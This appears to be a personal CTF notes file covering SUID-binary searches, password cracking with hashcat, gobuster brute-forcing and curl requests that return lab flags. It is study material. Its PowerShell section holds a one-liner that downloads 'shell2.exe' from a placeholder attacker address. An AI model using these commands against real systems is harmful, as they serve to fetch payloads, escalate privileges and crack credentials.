# writeUp
Just my write up for CTF

# SUID
```console
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null # scan the whole file system to find all files with the SUID bit set that is own by root
$ find / -perm -4000 -exec ls -ldb {} \; 2> /dev/null
$ find / -perm -u=s -type f 2>/dev/null
$ find / -perm -4000 -exec ls -ldb {} \; 2> /dev/null # same as about but own by any user
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null # both SUID and SUIG
```

# powershell
```
powershell -command "IEX (New-Object System.Net.WebClient).Downloadfile('http://<ip>:<port>/shell2.exe','shell2.exe')"
powershell -c "Invoke-WebRequest -Uri 'web' -OutFile 'out'"
```
# Hashcat
```console
hashcat -m <op> -a 0 -o crack.txt 'hash' /usr/share/wordlists/rockyou.txt --force
```
# gobuster
```console
gobuster dir -u http://<ip>/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html -t 54
```
# curl
```console
kali@kali:~$ curl http://10.10.10.204:8081/ctf/get
thm{162520bec925bd7979e9ae65a725f99f}kali@kali:~$ ^C
kali@kali:~$ curl -d 'flag_please' http://10.10.10.204:8081/ctf/post
thm{3517c902e22def9c6e09b99a9040ba09}kali@kali:~$ ^C
kali@kali:~$ curl http://10.10.10.204:8081/ctf/getcookie
Check your cookies!kali@kali:~$ curl http://10.10.10.204:8081/ctf/getcookie -i
HTTP/1.1 200 OK
Set-Cookie: flag=thm{91b1ac2606f36b935f465558213d7ebd}; Path=/
Date: Fri, 17 Jul 2020 12:44:02 GMT
Content-Length: 19
Content-Type: text/plain; charset=utf-8

Check your cookies!                                                                                               
kali@kali:~$ curl http://10.10.10.204:8081/ctf/sendcookie -i --cookie flagpls=flagpls                                                         
HTTP/1.1 200 OK                                                                                    
Date: Fri, 17 Jul 2020 12:46:55 GMT                                                                
Content-Length: 37                                                                                 
Content-Type: text/plain; charset=utf-8

thm{c10b5cb7546f359d19c747db2d0f47b3}
```